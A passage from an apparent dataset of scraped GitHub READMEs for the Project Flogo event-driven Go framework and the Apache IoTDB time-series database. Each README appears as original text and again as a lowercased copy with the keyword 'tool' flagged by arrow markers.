with the CLI couldn't be any easier (refer to Flogo CLI repo for detail instructions and dependencies):\nInstall the CLI\ngo get -u github.com/project-flogo/cli/...\nCreate & build your app\nflogo the core CLI for creating and building your applications\nflogogen a scaffolding tool to begin building your Flogo contributions (activities, triggers & actions)\nIf you're interested in building your own contribution(s), refer to the Flogo Documentation or join us on the project-flogo/Lobby Gitter Channel.\nGolang API\nAre you the kind of person who would rather code, but would love to leverage the capabilities of the Flogo Ecosystem? Makes total sense, we just \u2764\ufe0f to code also! We\u2019ve exposed a number of Go APIs for leveraging the various action types, activities and triggers. Getting started is pretty easy, just follow the steps below.\nGo get the latest flogo-lib\ngo get -u github.com/project-flogo/core/...\nOptionally, if you're using any of the Flogo contributions, don't forget to get that repo, as well\ngo get -u github.com/project-flogo/contrib/...\nOpen up your favorite IDE or txt editor and start coding!\npackage main\nimport (\n\"context\"\n\"fmt\"\n\"github.com/project-flogo/contrib/activity/log\"\n\"github.com/project-flogo/contrib/trigger/rest\"\n\"github.com/project-flogo/core/activity\"\n\"github.com/project-flogo/core/api\"\n\"github.com/project-flogo/core/data/coerce\"\n\"github.com/project-flogo/core/engine\"\n)\nfunc main() {\napp := myApp()\ne, err := api.NewEngine(app)\nif err != nil {\nfmt.Println(\"Error:\", err)\nreturn\n}\nengine.RunEngine(e)\n}\nfunc myApp() *api.App {\napp := api.NewApp()\ntrg := app.NewTrigger(&rest.Trigger{}, &rest.Settings{Port: 8080})\nh, _ := trg.NewHandler(&rest.HandlerSettings{Method: \"GET\", Path: \"/blah/:num\"})\nh.NewAction(RunActivities)\n//store in map to avoid activity instance recreation\nlogAct, _ := api.NewActivity(&log.Activity{})\nactivities = map[string]activity.Activity{\"log\": logAct}\nreturn app\n}\nvar activities map[string]activity.Activity\nfunc RunActivities(ctx context.Context, inputs map[string]interface{}) (map[string]interface{}, error) {\ntrgOut := &rest.Output{}\ntrgOut.FromMap(inputs)\nmsg, _ := coerce.ToString(trgOut.PathParams)\n_, err := api.EvalActivity(activities[\"log\"], &log.Input{Message: msg})\nif err != nil {\nreturn nil, err\n}\nresponse := make(map[string]interface{})\nresponse[\"id\"] = \"123\"\nresponse[\"amount\"] = \"1\"\nresponse[\"balance\"] = \"500\"\nresponse[\"currency\"] = \"USD\"\nreply := &rest.Reply{Code: 200, Data: response}\nreturn reply.ToMap(), nil\n}\nBefore we can build the app, let's generate the metadata for the triggers\ngo generate\nBuild the app\ngo build\nWhen to use Flogo\nYou\u2019ll look to leverage Flogo if you\u2019re a dev & sick of building all the messy stuff that comes along with coding production apps. Such as connectivity to event-driven messaging platforms, datastores, SaaS apps, etc & want to deploy to a wide range of targets, such as\nserverless compute\nIoT edge devices\ncontainers\nThe broader Flogo ecosystem exposes an opinionated perspective on building event-driven apps. If you\u2019re looking to process events in any of the following ways, then read on because the Project Flogo Ecosystem is for you!\nlong running processes with flow-control support geared toward application integration\nconsuming and manipulating large streams of events via a pipeline to act as a pre-processor for time-series data to serve things like machine learning models or to derive simple conclustions via data aggregation\ncontextual, declarative rules for real-time decisioning\nIn short...\nFlogo is... Flogo is not...\nan ecosystem of opinionated, event-driven capabilities a front-end web app or analytics framework\na Go lib to increase dev productivity an IoT platform\nContributing\nWant to contribute to Project Flogo? We've made it easy, all you need to do is fork the repository you intend to contribute to, make your changes and create a Pull Request! Once the pull request has been created, you'll be prompted to sign the CLA (Contributor License Agreement) online.\nNot sure where to start? No problem, here are a few suggestions:\nflogo-contrib: This repository contains all of the standard contributions, such as activities, triggers, etc. Perhaps there is something missing? Create a new activity or trigger or fix a bug in an existing activity or trigger. Don't forget to check all of the other repositores in the project-flogo org on GitHub, as some contributions are large enough to have their own repo.\nBrowse all of the [Project Flogo repositories] and look for issues tagged kind/help-wanted or good first issue\nIf you have any questions, feel free to post an issue and tag it as a question, email flogo-oss@tibco.com or chat with the team and community:\nThe project-flogo/Lobby Gitter channel should be used for general discussions, start here for all things Flogo!\nThe project-flogo/developers Gitter channel should be used for developer/contributor focused conversations.\nFor additional details, refer to the Contribution Guidelines.\nLicense\nProject Flogo is licensed under a BSD-style license. Refer to LICENSE for license text.\nUsage Guidelines\nWe\u2019re excited that you\u2019re using Project Flogo to power your project(s). Please adhere to the usage guidelines when referencing the use of Project Flogo within your project(s) and don't forget to let others know you're using Project Flogo by proudly displaying one of the following badges or the Flynn logo, found in the branding folder of this project.", "link": "https://github.com/TIBCOSoftware/flogo", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "project flogo is an open source ecosystem for event-driven apps\necosystem | core | flows | streams | flogo rules | go developers | when to use flogo | contributing | license\nproject flogo is an ultra-light, go-based open source ecosystem for building event-driven apps. event-driven, you say? yup, the notion of triggers and actions are leveraged to process incoming events. an action, a common interface, exposes key capabilities such as application integration, stream processing, etc.\napp = trigger(s) + actions[&activities]\ntriggers\nreceive data from external sources.\nare managed by a configurable threading model\nhave a common interface enabling anyone to build a flogo trigger.\nhandlers\ndispatch events to actions\nactions\nprocess events in a manner suitable with the implementation\nhave a common interface enabling opinionated event processing capabilities\nproject flogo ecosystem\nall capabilities within the flogo ecosystem have a few things in common, they all process events (in a manner suitable for the specific purpose) and they all implement the action interface exposed by flogo core.\nsome of the key highlights include:\n\ud83c\udf88 ultra-light 20x-50x lighter than java or node.js\n\u26a1\ufe0f event-driven powerful event-driven programming model based on triggers and actions\n\u2699\ufe0f common core a single, common core enables reuse and flexibility across all eventing constructs\n\u270f\ufe0f golang based written entirely in golang for efficiency\n\ud83d\udcaa deployment flexibility deploy as ultra-lightweight serverless functions, containers or static binaries on iot edge devices\n\ud83e\udde0 native machine learning purpose built activity for tensorflow savedmodel inferencing\n\ud83d\ude0d 100% open source for your dev & hacking pleasure\nintegration flows application integration process engine with conditional branching and a visual development environment\nstream processing a simple pipeline-based stream processing action with event joining capabilities across multiple triggers & aggregation over time windows\ncontextual decisioning declarative rules for real-time contextual decisions\nmicrogateway microgateway pattern for conditional, content-based routing, jwt validation, rate limiting, circuit breaking and other common patterns\nthe concept is simple, an event is just that, an event, how it\u2019s processed is what differs. flogo core eases the burden by enabling a common set of functionality, such as:\nthreading\nlogging\ndata type coercion\ndata mapping\ntracing & monitoring hooks\nwhile also exposing a common set of contributions via activities and triggers. for example, all available triggers can be leveraged to dispatch events to any action implementation, that is, flows for application integration, streams for stream processing, rules for contextual rule processing, etc.\nflogo core\nflogo core is an event-driven app framework used to develop apps for the cloud & iot edge. it can also be thought of as a lightweight app kernel used by open source & commercial solutions.\nflogo core provides the following key benefits:\n\u26d3 action chaining enables communication between one or more capabilities in a single, sub 10mb binary!\n\ud83c\udfd7 common contribution model build activities and triggers that can be leveraged by all capabilities\n\ud83d\udd28 extensible easily extend the capabilities available by building your own action using the common interfaces\nflogo core contribution model\nflogo core exposes three principal contribution interfaces that enable developers to build common capabilities and functionality. these contribution interfaces include:\ntrigger interface a common interface for building event-consumers that dispatch events to one or more actions. the kafka subscriber is an example of a trigger.\nactivity interface a common interface for exposing common application logic in a reusable manner. think of this as a function, such as write to database, publish to kafka, etc that can be used by all flogo apps.\naction interface a common interface for processing events. actions contain the specific capability logic, such as integration, stream processing, rule processing, etc. actions have a great deal of flexibility in how they\u2019re developed and how developers leverage actions within their overall applications. for example, flows and streams expose json-based dsls & go apis for maximum developer flexibility.\nrepos\nproject flogo consists of the following sub-projects available as separate repos:\nflogo-cli: command line tools for building flogo apps & extensions\nflogo-core: the core flogo library\nflogo-contrib: flogo contributions/extensions\nproject-flogo/stream: flogo streams action\nproject-flogo/rules: contextual, deterministic rules action\nproject-flogo/microgateway: flogo microgateway action\nproject-flogo/flogo-web: flogo web ui\nflogo flows\nflogo flows provides application integration capabilities and includes the following key highlights.\n\ud83c\udf08 painless development visual modeler with step-back debugging capabilities & elegant dsl\n\u2699\ufe0f ultra-light process engine for conditional flow control\ngetting started\nwe've made getting started with flogo flows as easy as possible. the current set of tooling is designed for:\nserverless function developers\ncloud-native microservices developers\niot solutions developers\ngo developers\nzero-code developers\nif your background is in or you prefer to develop your apps using zero-coding environments, then read on, because we\u2019ve got something special for you.\nflows web ui is available via docker hub or flogo.io. the docker image contains the flows web ui along with all required components to begin developing, testing and building deployable artifacts right from your web browser.\nto report any issues with the issue tracker on this project.\nflogo streams\nedge devices have the potential for producing millions or even billions of events at rapid intervals, often times the events on their own are meaningless, hence the need to provide basic streaming operations against the slew of events.\na native streaming action as part of the project flogo ecosystem accomplishes the following primary objectives:\nenables apps to implement basic streaming constructs in a simple pipeline fashion\nprovides non-persistent state for streaming operations\nstreams are persisted in memory until the end of the pipeline\nserves as a pre-process pipeline for raw data to perform basic mathematical and logical operations. ideal for feeding ml models\nsome of the key highlights include:\n\ud83d\ude00 simple pipeline construct enables a clean, easy way of dealing with streams of data\n\u23f3 stream aggregation across streams using time or event tumbling & sliding windows\n\ud83d\ude4c join streams from multiple event sources\n\ud83c\udf2a filter out the noise with stream filtering capabilities\ngetting started\nwe\u2019ve made building powerful streaming pipelines as easy as possible. develop your pipelines using:\na simple, clean json-based dsl\ngolang api\nsee the sample below of an aggregation pipeline (for brevity, the triggers and metadata of the resource has been omitted). also don\u2019t forget to check out the examples in the project-flogo/stream repo.\n\"stages\": [\n{\n\"ref\": \"github.com/project-flogo/stream/activity/aggregate\",\n\"settings\": {\n\"function\": \"sum\",\n\"windowtype\": \"timetumbling\",\n\"windowsize\": \"5000\"\n},\n\"input\": {\n\"value\": \"=$.input\"\n}\n},\n{\n\"ref\": \"github.com/project-flogo/contrib/activity/log\",\n\"input\": {\n\"message\": \"=$.result\"\n}\n}\n]\nflogo rules\nprocessing events in real-time to determine next best action is an important function of event driven applications. with the vast amount of events that are generated from different sources, making sense of the information in a given context can be immensely valuable.\nflogo rules simplifies the complexity involved with real-time contextual decisions.\nflogo rules supports\ndeclarative rules to define conditional logic and trigger result rules\njoins/correlations across multiple event sources\nability to define rule priorities\ntimer events; configurable ttl (time to live) -1 - no expiry, 0 - event expiry set to end of run to completion cycle.\nforward chaining for inferencing\nthe cli\nthe cli is used to build all applications that leverage the json-based dsl. if you\u2019re using the go api to build your apps, feel free to just go build your stuff without the flogo cli.\ngetting started with the cli couldn't be any easier (refer to flogo cli repo for detail instructions and dependencies):\ninstall the cli\ngo get -u github.com/project-flogo/cli/...\ncreate & build your app\nflogo the core cli for creating and building your applications\nflogogen a scaffolding -----> tool !!!  to begin building your flogo contributions (activities, triggers & actions)\nif you're interested in building your own contribution(s), refer to the flogo documentation or join us on the project-flogo/lobby gitter channel.\ngolang api\nare you the kind of person who would rather code, but would love to leverage the capabilities of the flogo ecosystem? makes total sense, we just \u2764\ufe0f to code also! we\u2019ve exposed a number of go apis for leveraging the various action types, activities and triggers. getting started is pretty easy, just follow the steps below.\ngo get the latest flogo-lib\ngo get -u github.com/project-flogo/core/...\noptionally, if you're using any of the flogo contributions, don't forget to get that repo, as well\ngo get -u github.com/project-flogo/contrib/...\nopen up your favorite ide or txt editor and start coding!\npackage main\nimport (\n\"context\"\n\"fmt\"\n\"github.com/project-flogo/contrib/activity/log\"\n\"github.com/project-flogo/contrib/trigger/rest\"\n\"github.com/project-flogo/core/activity\"\n\"github.com/project-flogo/core/api\"\n\"github.com/project-flogo/core/data/coerce\"\n\"github.com/project-flogo/core/engine\"\n)\nfunc main() {\napp := myapp()\ne, err := api.newengine(app)\nif err != nil {\nfmt.println(\"error:\", err)\nreturn\n}\nengine.runengine(e)\n}\nfunc myapp() *api.app {\napp := api.newapp()\ntrg := app.newtrigger(&rest.trigger{}, &rest.settings{port: 8080})\nh, _ := trg.newhandler(&rest.handlersettings{method: \"get\", path: \"/blah/:num\"})\nh.newaction(runactivities)\n//store in map to avoid activity instance recreation\nlogact, _ := api.newactivity(&log.activity{})\nactivities = map[string]activity.activity{\"log\": logact}\nreturn app\n}\nvar activities map[string]activity.activity\nfunc runactivities(ctx context.context, inputs map[string]interface{}) (map[string]interface{}, error) {\ntrgout := &rest.output{}\ntrgout.frommap(inputs)\nmsg, _ := coerce.tostring(trgout.pathparams)\n_, err := api.evalactivity(activities[\"log\"], &log.input{message: msg})\nif err != nil {\nreturn nil, err\n}\nresponse := make(map[string]interface{})\nresponse[\"id\"] = \"123\"\nresponse[\"amount\"] = \"1\"\nresponse[\"balance\"] = \"500\"\nresponse[\"currency\"] = \"usd\"\nreply := &rest.reply{code: 200, data: response}\nreturn reply.tomap(), nil\n}\nbefore we can build the app, let's generate the metadata for the triggers\ngo generate\nbuild the app\ngo build\nwhen to use flogo\nyou\u2019ll look to leverage flogo if you\u2019re a dev & sick of building all the messy stuff that comes along with coding production apps. such as connectivity to event-driven messaging platforms, datastores, saas apps, etc & want to deploy to a wide range of targets, such as\nserverless compute\niot edge devices\ncontainers\nthe broader flogo ecosystem exposes an opinionated perspective on building event-driven apps. if you\u2019re looking to process events in any of the following ways, then read on because the project flogo ecosystem is for you!\nlong running processes with flow-control support geared toward application integration\nconsuming and manipulating large streams of events via a pipeline to act as a pre-processor for time-series data to serve things like machine learning models or to derive simple conclustions via data aggregation\ncontextual, declarative rules for real-time decisioning\nin short...\nflogo is... flogo is not...\nan ecosystem of opinionated, event-driven capabilities a front-end web app or analytics framework\na go lib to increase dev productivity an iot platform\ncontributing\nwant to contribute to project flogo? we've made it easy, all you need to do is fork the repository you intend to contribute to, make your changes and create a pull request! once the pull request has been created, you'll be prompted to sign the cla (contributor license agreement) online.\nnot sure where to start? no problem, here are a few suggestions:\nflogo-contrib: this repository contains all of the standard contributions, such as activities, triggers, etc. perhaps there is something missing? create a new activity or trigger or fix a bug in an existing activity or trigger. don't forget to check all of the other repositores in the project-flogo org on github, as some contributions are large enough to have their own repo.\nbrowse all of the [project flogo repositories] and look for issues tagged kind/help-wanted or good first issue\nif you have any questions, feel free to post an issue and tag it as a question, email flogo-oss@tibco.com or chat with the team and community:\nthe project-flogo/lobby gitter channel should be used for general discussions, start here for all things flogo!\nthe project-flogo/developers gitter channel should be used for developer/contributor focused conversations.\nfor additional details, refer to the contribution guidelines.\nlicense\nproject flogo is licensed under a bsd-style license. refer to license for license text.\nusage guidelines\nwe\u2019re excited that you\u2019re using project flogo to power your project(s). please adhere to the usage guidelines when referencing the use of project flogo within your project(s) and don't forget to let others know you're using project flogo by proudly displaying one of the following badges or the flynn logo, found in the branding folder of this project.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000066, "year": null}, {"Unnamed: 0": 68, "autor": 68, "date": null, "content": "English | \u4e2d\u6587\nIoTDB\nOverview\nIoTDB (Internet of Things Database) is a data management system for time series data, which can provide users specific services, such as, data collection, storage and analysis. Due to its light weight structure, high performance and usable features together with its seamless integration with the Hadoop and Spark ecology, IoTDB meets the requirements of massive dataset storage, high throughput data input, and complex data analysis in the industrial IoT field.\nMain Features\nMain features of IoTDB are as follows:\nFlexible deployment strategy. IoTDB provides users a one-click installation tool on either the cloud platform or the terminal devices, and a data synchronization tool bridging the data on cloud platform and terminals.\nLow cost on hardware. IoTDB can reach a high compression ratio of disk storage.\nEfficient directory structure. IoTDB supports efficient organization for complex time series data structure from intelligent networking devices, organization for time series data from devices of the same type, fuzzy searching strategy for massive and complex directory of time series data.\nHigh-throughput read and write. IoTDB supports millions of low-power devices' strong connection data access, high-speed data read and write for intelligent networking devices and mixed devices mentioned above.\nRich query semantics. IoTDB supports time alignment for time series data across devices and measurements, computation in time series field (frequency domain transformation) and rich aggregation function support in time dimension.\nEasy to get started. IoTDB supports SQL-Like language, JDBC standard API and import/export tools which is easy to use.\nSeamless integration with state-of-the-practice Open Source Ecosystem. IoTDB supports analysis ecosystems such as, Hadoop, Spark, and visualization tool, such as, Grafana.\nFor the latest information about IoTDB, please visit IoTDB official website. If you encounter any problems or identify any bugs while using IoTDB, please report an issue in jira.\nOutline\nIoTDB\nOverview\nMain Features\nOutline\nQuick Start\nPrerequisites\nInstallation\nBuild from source\nConfigurations\nStart\nStart IoTDB\nUse IoTDB\nUse Cli\nBasic commands for IoTDB\nStop IoTDB\nOnly build server\nOnly build cli\nUsage of CSV Import and Export Tool\nQuick Start\nThis short guide will walk you through the basic process of using IoTDB. For a more detailed introduction, please visit our website's User Guide.\nPrerequisites\nTo use IoTDB, you need to have:\nJava >= 1.8 (1.8, 11 to 17 are verified. Please make sure the environment path has been set accordingly).\nMaven >= 3.6 (If you want to compile and install IoTDB from source code).\nSet the max open files num as 65535 to avoid \"too many open files\" error.\n(Optional) Set the somaxconn as 65535 to avoid \"connection reset\" error when the system is under high load.\n# Linux\n> sudo sysctl -w net.core.somaxconn=65535\n# FreeBSD or Darwin\n> sudo sysctl -w kern.ipc.somaxconn=65535\nInstallation\nIoTDB provides three installation methods, you can refer to the following suggestions, choose the one fits you best:\nInstallation from source code. If you need to modify the code yourself, you can use this method.\nInstallation from binary files. Download the binary files from the official website. This is the recommended method, in which you will get a binary released package which is out-of-the-box.\nUsing Docker\uff1aThe path to the dockerfile is https://github.com/apache/iotdb/tree/master/docker/src/main\nHere in the Quick Start, we give a brief introduction of using source code to install IoTDB. For further information, please refer to User Guide.\nBuild from source\nPrepare Thrift compiler\nSkip this chapter if you are using Windows.\nAs we use Thrift for our RPC module (communication and protocol definition), we involve Thrift during the compilation, so Thrift compiler 0.13.0 (or higher) is required to generate Thrift Java code. Thrift officially provides binary compiler for Windows, but unfortunately, they do not provide that for Unix OSs.\nIf you have permission to install new softwares, use apt install or yum install or brew install to install the Thrift compiler (If you already have installed the thrift compiler, skip this step). Then, you may add the following parameter when running Maven: -Dthrift.download-url=http://apache.org/licenses/LICENSE-2.0.txt -Dthrift.exec.absolute.path=<YOUR LOCAL THRIFT BINARY FILE>.\nIf not, then you have to compile the thrift compiler, and it requires you install a boost library first. Therefore, we compiled a Unix compiler ourselves and put it onto GitHub, and with the help of a maven plugin, it will be downloaded automatically during compilation. This compiler works fine with gcc8 or later, Ubuntu MacOS, and CentOS, but previous versions and other OSs are not guaranteed.\nIf you can not download the thrift compiler automatically because of network problem, you can download it yourself, and then either: rename your thrift file to {project_root}\\thrift\\target\\tools\\thrift_0.12.0_0.13.0_linux.exe; or, add Maven commands: -Dthrift.download-url=http://apache.org/licenses/LICENSE-2.0.txt -Dthrift.exec.absolute.path=<YOUR LOCAL THRIFT BINARY FILE>.\nCompile IoTDB\nYou can download the source code from:\ngit clone https://github.com/apache/iotdb.git\nThe default dev branch is the master branch, If you want to use a released version x.x.x:\ngit checkout release/x.x.x\nFrom v0.11.3 on, the tag name format is change to: vx.x.x:\ngit checkout vx.x.x\nUnder the root path of iotdb:\n> mvn clean package -DskipTests\nUsing -P compile-cpp for compiling cpp client (For more details, read client-cpp's Readme file.)\nThen the binary version (including both server and cli) can be found at distribution/target/apache-iotdb-{project.version}-all-bin.zip\nNOTE: Directories \"thrift/target/generated-sources/thrift\", \"thrift-sync/target/generated-sources/thrift\", \"thrift-cluster/target/generated-sources/thrift\" and \"antlr/target/generated-sources/antlr4\" need to be added to sources roots to avoid compilation errors in the IDE.\nIn IDEA, you just need to right click on the root project name and choose \"Maven->Reload Project\" after you run mvn package successfully.\nConfigurations\nconfiguration files are under \"conf\" folder\nenvironment config module (iotdb-env.bat, iotdb-env.sh),\nsystem config module (iotdb-engine.properties)\nlog config module (logback.xml).\nFor more information, please see Config Manual.\nStart\nYou can go through the following steps to test the installation, if there is no error returned after execution, the installation is completed.\nStart IoTDB\nUsers can start IoTDB by the start-server script under the sbin folder.\n# Unix/OS X\n> nohup sbin/start-server.sh >/dev/null 2>&1 &\nor\n> nohup sbin/start-server.sh -c <conf_path> -rpc_port <rpc_port> >/dev/null 2>&1 &\n# Windows\n> sbin\\start-server.bat -c <conf_path> -rpc_port <rpc_port>\n\"-c\" and \"-rpc_port\" are optional.\noption \"-c\" specifies the system configuration file directory.\noption \"-rpc_port\" specifies the rpc port.\nif both option specified, the rpc_port will overrides the rpc_port in conf_path.\nUse IoTDB\nUse Cli\nIoTDB offers different ways to interact with server, here we introduce the basic steps of using Cli tool to insert and query data.\nAfter installing IoTDB, there is a default user 'root', its default password is also 'root'. Users can use this default user to login Cli to use IoTDB. The startup script of Cli is the start-cli script in the folder sbin. When executing the script, user should assign IP, PORT, USER_NAME and PASSWORD. The default parameters are \"-h 127.0.0.1 -p 6667 -u root -pw -root\".\nHere is the command for starting the Cli:\n# Unix/OS X\n> sbin/start-cli.sh -h 127.0.0.1 -p 6667 -u root -pw root\n# Windows\n> sbin\\start-cli.bat -h 127.0.0.1 -p 6667 -u root -pw root\nThe command line cli is interactive, so you should see the welcome logo and statements if everything is ready:\n_____ _________ ______ ______\n|_ _| | _ _ ||_ _ `.|_ _ \\\n| | .--.|_/ | | \\_| | | `. \\ | |_) |\n| | / .'`\\ \\ | | | | | | | __'.\n_| |_| \\__. | _| |_ _| |_.' /_| |__) |\n|_____|'.__.' |_____| |______.'|_______/ version x.x.x\nIoTDB> login successfully\nIoTDB>\nBasic commands for IoTDB\nNow, let us introduce the way of creating timeseries, inserting data and querying data.\nThe data in IoTDB is organized as timeseries. Each timeseries includes multiple data-time pairs, and is owned by a storage group. Before defining a timeseries, we should define a storage group using SET STORAGE GROUP first, and here is an example:\nIoTDB> SET STORAGE GROUP TO root.ln\nWe can also use SHOW STORAGE GROUP to check the storage group being created:\nIoTDB> SHOW STORAGE GROUP\n+-------------+\n|storage group|\n+-------------+\n| root.ln|\n+-------------+\nTotal line number = 1\nAfter the storage group is set, we can use CREATE TIMESERIES to create a new timeseries. When creating a timeseries, we should define its data type and the encoding scheme. Here We create two timeseries:\nIoTDB> CREATE TIMESERIES root.ln.wf01.wt01.status WITH DATATYPE=BOOLEAN, ENCODING=PLAIN\nIoTDB> CREATE TIMESERIES root.ln.wf01.wt01.temperature WITH DATATYPE=FLOAT, ENCODING=RLE\nIn order to query the specific timeseries, we can use SHOW TIMESERIES . represent the location of the timeseries. The default value is \"null\", which queries all the timeseries in the system(the same as using \"SHOW TIMESERIES root\"). Here are some examples:\nQuerying all timeseries in the system:\nIoTDB> SHOW TIMESERIES\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\n| timeseries|alias|storage group|dataType|encoding|compression|tags|attributes|\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\n|root.ln.wf01.wt01.temperature| null| root.ln| FLOAT| RLE| SNAPPY|null| null|\n| root.ln.wf01.wt01.status| null| root.ln| BOOLEAN| PLAIN| SNAPPY|null| null|\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\nTotal line number = 2\nQuerying a specific timeseries(root.ln.wf01.wt01.status):\nIoTDB> SHOW TIMESERIES root.ln.wf01.wt01.status\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\n| timeseries|alias|storage group|dataType|encoding|compression|tags|attributes|\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\n|root.ln.wf01.wt01.status| null| root.ln| BOOLEAN| PLAIN| SNAPPY|null| null|\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\nTotal line number = 1\nInsert timeseries data is a basic operation of IoTDB, you can use \u2018INSERT\u2019 command to finish this. Before insertion, you should assign the timestamp and the suffix path name:\nIoTDB> INSERT INTO root.ln.wf01.wt01(timestamp,status) values(100,true);\nIoTDB> INSERT INTO root.ln.wf01.wt01(timestamp,status,temperature) values(200,false,20.71)\nThe data that you have just inserted will display as follows:\nIoTDB> SELECT status FROM root.ln.wf01.wt01\n+------------------------+------------------------+\n| Time|root.ln.wf01.wt01.status|\n+------------------------+------------------------+\n|1970-01-01T00:00:00.100Z| true|\n|1970-01-01T00:00:00.200Z| false|\n+------------------------+------------------------+\nTotal line number = 2\nYou can also query several timeseries data using one SQL statement:\nIoTDB> SELECT * FROM root.ln.wf01.wt01\n+------------------------+-----------------------------+------------------------+\n| Time|root.ln.wf01.wt01.temperature|root.ln.wf01.wt01.status|\n+------------------------+-----------------------------+------------------------+\n|1970-01-01T00:00:00.100Z| null| true|\n|1970-01-01T00:00:00.200Z| 20.71| false|\n+------------------------+-----------------------------+------------------------+\nTotal line number = 2\nTo change the time zone in Cli, you can use the following SQL:\nIoTDB> SET time_zone=+08:00\nTime zone has set to +08:00\nIoTDB> SHOW time_zone\nCurrent time zone: Asia/Shanghai\nAdd then the query result will show using the new time zone.\nIoTDB> SELECT * FROM root.ln.wf01.wt01\n+-----------------------------+-----------------------------+------------------------+\n| Time|root.ln.wf01.wt01.temperature|root.ln.wf01.wt01.status|\n+-----------------------------+-----------------------------+------------------------+\n|1970-01-01T08:00:00.100+08:00| null| true|\n|1970-01-01T08:00:00.200+08:00| 20.71| false|\n+-----------------------------+-----------------------------+------------------------+\nTotal line number = 2\nThe commands to exit the Cli are:\nIoTDB> quit\nor\nIoTDB> exit\nFor more information about the commands supported by IoTDB SQL, please see SQL Reference.\nStop IoTDB\nThe server can be stopped with \"ctrl-C\" or the following script:\n# Unix/OS X\n> sbin/stop-server.sh\n# Windows\n> sbin\\stop-server.bat\nOnly build server\nUnder the root path of iotdb:\n> mvn clean package -pl server -am -DskipTests\nAfter being built, the IoTDB server is located at the folder: \"server/target/iotdb-server-{project.version}\".\nOnly build cli\nUnder the root path of iotdb:\n> mvn clean package -pl cli -am -DskipTests\nAfter being built, the IoTDB cli is located at the folder \"cli/target/iotdb-cli-{project.version}\".\nUsage of CSV Import and Export Tool\nsee Usage of CSV Import and Export Tool\nFrequent Questions for Compiling\nsee Frequent Questions when Compiling the Source Code\nContact Us\nQQ Group\nApache IoTDB User Group: 659990460\nWechat Group\nAdd friend: tietouqiao or liutaohua001, and then we'll invite you to the group.\nSlack\nhttps://join.slack.com/t/apacheiotdb/shared_invite/zt-qvso1nj8-7715TpySZtZqmyG5qXQwpg\nsee Join the community for more!", "link": "https://github.com/apache/iotdb", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "english | \u4e2d\u6587\niotdb\noverview\niotdb (internet of things database) is a data management system for time series data, which can provide users specific services, such as, data collection, storage and analysis. due to its light weight structure, high performance and usable features together with its seamless integration with the hadoop and spark ecology, iotdb meets the requirements of massive dataset storage, high throughput data input, and complex data analysis in the industrial iot field.\nmain features\nmain features of iotdb are as follows:\nflexible deployment strategy. iotdb provides users a one-click installation -----> tool !!!  on either the cloud platform or the terminal devices, and a data synchronization -----> tool !!!  bridging the data on cloud platform and terminals.\nlow cost on hardware. iotdb can reach a high compression ratio of disk storage.\nefficient directory structure. iotdb supports efficient organization for complex time series data structure from intelligent networking devices, organization for time series data from devices of the same type, fuzzy searching strategy for massive and complex directory of time series data.\nhigh-throughput read and write. iotdb supports millions of low-power devices' strong connection data access, high-speed data read and write for intelligent networking devices and mixed devices mentioned above.\nrich query semantics. iotdb supports time alignment for time series data across devices and measurements, computation in time series field (frequency domain transformation) and rich aggregation function support in time dimension.\neasy to get started. iotdb supports sql-like language, jdbc standard api and import/export tools which is easy to use.\nseamless integration with state-of-the-practice open source ecosystem. iotdb supports analysis ecosystems such as, hadoop, spark, and visualization tool, such as, grafana.\nfor the latest information about iotdb, please visit iotdb official website. if you encounter any problems or identify any bugs while using iotdb, please report an issue in jira.\noutline\niotdb\noverview\nmain features\noutline\nquick start\nprerequisites\ninstallation\nbuild from source\nconfigurations\nstart\nstart iotdb\nuse iotdb\nuse cli\nbasic commands for iotdb\nstop iotdb\nonly build server\nonly build cli\nusage of csv import and export tool\nquick start\nthis short guide will walk you through the basic process of using iotdb. for a more detailed introduction, please visit our website's user guide.\nprerequisites\nto use iotdb, you need to have:\njava >= 1.8 (1.8, 11 to 17 are verified. please make sure the environment path has been set accordingly).\nmaven >= 3.6 (if you want to compile and install iotdb from source code).\nset the max open files num as 65535 to avoid \"too many open files\" error.\n(optional) set the somaxconn as 65535 to avoid \"connection reset\" error when the system is under high load.\n# linux\n> sudo sysctl -w net.core.somaxconn=65535\n# freebsd or darwin\n> sudo sysctl -w kern.ipc.somaxconn=65535\ninstallation\niotdb provides three installation methods, you can refer to the following suggestions, choose the one fits you best:\ninstallation from source code. if you need to modify the code yourself, you can use this method.\ninstallation from binary files. download the binary files from the official website. this is the recommended method, in which you will get a binary released package which is out-of-the-box.\nusing docker\uff1athe path to the dockerfile is https://github.com/apache/iotdb/tree/master/docker/src/main\nhere in the quick start, we give a brief introduction of using source code to install iotdb. for further information, please refer to user guide.\nbuild from source\nprepare thrift compiler\nskip this chapter if you are using windows.\nas we use thrift for our rpc module (communication and protocol definition), we involve thrift during the compilation, so thrift compiler 0.13.0 (or higher) is required to generate thrift java code. thrift officially provides binary compiler for windows, but unfortunately, they do not provide that for unix oss.\nif you have permission to install new softwares, use apt install or yum install or brew install to install the thrift compiler (if you already have installed the thrift compiler, skip this step). then, you may add the following parameter when running maven: -dthrift.download-url=http://apache.org/licenses/license-2.0.txt -dthrift.exec.absolute.path=<your local thrift binary file>.\nif not, then you have to compile the thrift compiler, and it requires you install a boost library first. therefore, we compiled a unix compiler ourselves and put it onto github, and with the help of a maven plugin, it will be downloaded automatically during compilation. this compiler works fine with gcc8 or later, ubuntu macos, and centos, but previous versions and other oss are not guaranteed.\nif you can not download the thrift compiler automatically because of network problem, you can download it yourself, and then either: rename your thrift file to {project_root}\\thrift\\target\\tools\\thrift_0.12.0_0.13.0_linux.exe; or, add maven commands: -dthrift.download-url=http://apache.org/licenses/license-2.0.txt -dthrift.exec.absolute.path=<your local thrift binary file>.\ncompile iotdb\nyou can download the source code from:\ngit clone https://github.com/apache/iotdb.git\nthe default dev branch is the master branch, if you want to use a released version x.x.x:\ngit checkout release/x.x.x\nfrom v0.11.3 on, the tag name format is change to: vx.x.x:\ngit checkout vx.x.x\nunder the root path of iotdb:\n> mvn clean package -dskiptests\nusing -p compile-cpp for compiling cpp 